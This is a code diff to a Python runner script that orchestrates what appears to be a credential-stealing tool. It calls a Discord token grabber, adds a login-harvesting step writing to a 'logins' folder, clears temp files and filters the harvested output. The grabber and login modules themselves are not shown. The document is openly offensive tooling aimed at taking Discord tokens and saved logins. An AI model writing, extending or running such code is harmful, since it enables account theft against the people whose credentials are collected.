@@ -2,6 +2,8 @@ import os
 import time
 from resources.rename import rename_folders
 from resources.DiscordTokens import token_grabber
+from resources.logins import *
+from resources.filter import *
 
 def runner(base_folder):
     if not os.path.exists(base_folder):
@@ -11,12 +13,24 @@ def runner(base_folder):
         rename_folders(os.path.join(base_folder))
         print("----Starting DIscord Token Grabber.---- ")
         time.sleep(5)
-        token_grabber(base_folder ,os.path.join("data/DiscordTokens.txt"))
-        print("----Starting ")
+        if not os.path.exists("Discord"):
+            os.makedirs("Discord")
+        token_grabber(base_folder ,os.path.join("Discord","DiscordTokens.txt"))
+        print("----Starting logger.----")
         time.sleep(5)
-        
-
+        if not os.path.exists("logins"):
+            os.makedirs("logins")
+        runlogins(base_folder)
+        print("----Successfully logged .. Clearing temp files.----")
+        time.sleep(5)
+        os.remove("temp.txt")
+        print("----Starting Filtering.----")
+        time.sleep(5)
+        filter_files("Discord")
+        filter_files("logins")
+        print("-----------------------ALL DONE.-----------------------")
 
 if __name__ == "__main__":
     base_folder = input("Enter base folder name ")
     runner(base_folder)
+    
